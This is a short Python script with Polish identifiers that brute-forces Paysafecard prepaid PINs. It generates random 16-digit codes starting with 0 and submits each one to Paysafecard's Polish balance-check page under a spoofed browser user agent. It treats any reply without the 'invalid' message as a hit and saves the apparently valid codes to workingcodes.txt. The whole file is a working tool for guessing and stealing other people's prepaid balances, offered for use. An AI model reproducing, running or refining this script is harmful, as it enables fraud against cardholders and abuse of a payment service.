import requests
from bs4 import BeautifulSoup
import random
import string

def sprawdz_kod_psc(kod):
    # Set user agent
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'
    }
    
    # URL for checking PSC code
    url = "https://www.paysafecard.com/pl/sprawdzanie-dostepnych-srodkow/"
    
    # Prepare data to send
    data = {
        'pin': kod,
        'submit': 'Check balance'
    }
    
    # Execute POST request
    response = requests.post(url, headers=headers, data=data)
    
    # Check response status
    if response.status_code == 200:
        # Process response
        soup = BeautifulSoup(response.text, 'html.parser')
        result = soup.find('div', {'class': 'c-form-checker__result'})
        
        if result:
            if "jest niepoprawny" in result.text:
                return False
            else:
                return True
        else:
            return False
    else:
        return False

def generuj_kod():
    kod = '0'  # Initial digit is 0
    kod += ''.join(random.choices(string.digits, k=15))  # Next 15 digits are randomly chosen
    return kod

def zapisz_do_pliku(kody):
    with open('workingcodes.txt', 'w') as file:
        for kod in kody:
            file.write(kod + '\n')

# Main program
def main():
    ilosc_kodow = int(input("How many codes do you want to check: "))
    znalezione_kody = []
    licznik_prawidlowych_kodow = 0
    
    while len(znalezione_kody) < ilosc_kodow:
        kod_psc = generuj_kod()
        print("Checking code:", kod_psc)
        if sprawdz_kod_psc(kod_psc):
            print("Valid code found:", kod_psc)
            znalezione_kody.append(kod_psc)
            licznik_prawidlowych_kodow += 1
        else:
            print("The code is invalid.")
    
    print("Number of valid codes found:", licznik_prawidlowych_kodow)
    
    if znalezione_kody:
        zapisz_do_pliku(znalezione_kody)
        print("Valid codes have been saved to the file 'workingcodes.txt'.")

if __name__ == "__main__":
    main()
    
